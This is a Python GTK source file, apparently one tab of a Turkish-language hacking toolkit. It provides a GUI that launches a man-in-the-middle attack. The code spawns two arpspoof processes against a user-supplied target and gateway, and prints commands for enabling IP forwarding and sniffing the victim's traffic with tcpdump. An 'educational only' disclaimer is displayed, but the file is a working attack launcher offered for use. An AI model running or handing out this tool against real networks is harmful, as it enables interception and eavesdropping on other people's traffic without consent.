import gi
gi.require_version("Gtk", "3.0")
from gi.repository import Gtk, GLib
import threading
import subprocess


class MITMTab(Gtk.Box):
    def __init__(self):
        super().__init__(orientation=Gtk.Orientation.VERTICAL, spacing=12)
        self.set_border_width(24)

        title = Gtk.Label(label="MITM - Ortadaki Adam Saldırısı")
        title.get_style_context().add_class("title-label")
        title.set_xalign(0)
        self.pack_start(title, False, False, 0)

        desc = Gtk.Label(label="Ortadaki Adam (MITM) saldirisi icin ARP spoofing kullanir. Ag trafigini yonlendirerek dinleme yapar. Sadece egitim amacli.")
        desc.get_style_context().add_class("desc-label")
        desc.set_line_wrap(True)
        desc.set_xalign(0)
        self.pack_start(desc, False, False, 0)

        sep = Gtk.Separator()
        self.pack_start(sep, False, False, 4)

        # Hedef
        frame = Gtk.Frame(label="Hedef Ayarları")
        grid = Gtk.Grid()
        grid.set_border_width(16)
        grid.set_row_spacing(8)
        grid.set_column_spacing(8)

        grid.attach(Gtk.Label(label="Hedef IP:"), 0, 0, 1, 1)
        self.target_entry = Gtk.Entry()
        self.target_entry.set_placeholder_text("192.168.1.100")
        grid.attach(self.target_entry, 1, 0, 1, 1)

        grid.attach(Gtk.Label(label="Gateway IP:"), 0, 1, 1, 1)
        self.gateway_entry = Gtk.Entry()
        self.gateway_entry.set_placeholder_text("192.168.1.1")
        grid.attach(self.gateway_entry, 1, 1, 1, 1)

        grid.attach(Gtk.Label(label="Arayüz:"), 0, 2, 1, 1)
        self.iface_entry = Gtk.Entry()
        self.iface_entry.set_placeholder_text("wlan0 / eth0")
        grid.attach(self.iface_entry, 1, 2, 1, 1)

        frame.add(grid)
        self.pack_start(frame, False, False, 0)

        # Kontroller
        hbox = Gtk.Box(spacing=8)
        hbox.set_halign(Gtk.Align.CENTER)
        self.start_btn = Gtk.Button(label="ARP Spoofing Başlat")
        self.start_btn.connect("clicked", lambda _: self.start_mitm())
        hbox.pack_start(self.start_btn, False, False, 0)
        self.stop_btn = Gtk.Button(label="Durdur")
        self.stop_btn.set_sensitive(False)
        self.stop_btn.connect("clicked", lambda _: self.stop_mitm())
        hbox.pack_start(self.stop_btn, False, False, 0)
        self.pack_start(hbox, False, False, 0)

        # Log
        self.textview = Gtk.TextView()
        self.textview.set_editable(False)
        self.textview.set_monospace(True)
        self.textbuffer = self.textview.get_buffer()
        sw = Gtk.ScrolledWindow()
        sw.set_policy(Gtk.PolicyType.AUTOMATIC, Gtk.PolicyType.AUTOMATIC)
        sw.set_vexpand(True)
        sw.add(self.textview)
        self.pack_start(sw, True, True, 0)

        self.status_label = Gtk.Label(label="")
        self.pack_start(self.status_label, False, False, 0)

        self.running = False
        self.processes = []

    def append_text(self, text):
        end = self.textbuffer.get_end_iter()
        self.textbuffer.insert(end, text + "\n")

    def start_mitm(self):
        target = self.target_entry.get_text().strip()
        gateway = self.gateway_entry.get_text().strip()
        iface = self.iface_entry.get_text().strip()

        if not target or not gateway or not iface:
            self.status_label.set_text("Tüm alanları doldurun")
            return

        self.running = True
        self.start_btn.set_sensitive(False)
        self.stop_btn.set_sensitive(True)
        self.textbuffer.set_text("")
        self.append_text("[*] MITM saldırısı başlatılıyor...")
        self.append_text(f"[*] Hedef: {target}")
        self.append_text(f"[*] Gateway: {gateway}")
        self.append_text(f"[*] Arayüz: {iface}")
        self.status_label.set_text("MITM çalışıyor...")

        self.append_text(f"\n[!] Uyarı: Bu araç yalnızca eğitim amaçlıdır.")
        self.append_text(f"[!] İzinsiz kullanımı yasa dışıdır.\n")

        self.append_text(f"\n[*] Kullanılabilecek komutlar:")
        self.append_text(f"  # IP forwarding aç:")
        self.append_text(f"  sudo sysctl -w net.ipv4.ip_forward=1")
        self.append_text(f"  # ARP spoofing (hedef):")
        self.append_text(f"  sudo arpspoof -i {iface} -t {target} {gateway}")
        self.append_text(f"  # ARP spoofing (gateway):")
        self.append_text(f"  sudo arpspoof -i {iface} -t {gateway} {target}")
        self.append_text(f"  # Trafik dinleme:")
        self.append_text(f"  sudo tcpdump -i {iface} host {target}")

        thread = threading.Thread(target=self.run_mitm,
                                   args=(target, gateway, iface), daemon=True)
        thread.start()

    def run_mitm(self, target, gateway, iface):
        import time
        self.append_text(f"\n[*] ARP spoofing çalıştırılıyor...")
        try:
            p1 = subprocess.Popen(
                ["arpspoof", "-i", iface, "-t", target, gateway],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            p2 = subprocess.Popen(
                ["arpspoof", "-i", iface, "-t", gateway, target],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
            )
            self.processes = [p1, p2]
            self.append_text(f"[+] ARP spoofing çalışıyor (PID: {p1.pid}, {p2.pid})")
            self.append_text("[*] IP forwarding açık olmalı: sysctl -w net.ipv4.ip_forward=1")
            p1.wait()
        except FileNotFoundError:
            self.append_text("[-] arpspoof bulunamadı. Yüklemek için: sudo pacman -S dsniff")
        except Exception as e:
            self.append_text(f"[-] Hata: {e}")

    def stop_mitm(self):
        self.running = False
        for p in self.processes:
            p.terminate()
        self.processes = []
        self.start_btn.set_sensitive(True)
        self.stop_btn.set_sensitive(False)
        self.append_text("\n[*] MITM durduruldu")
        self.status_label.set_text("Durduruldu")
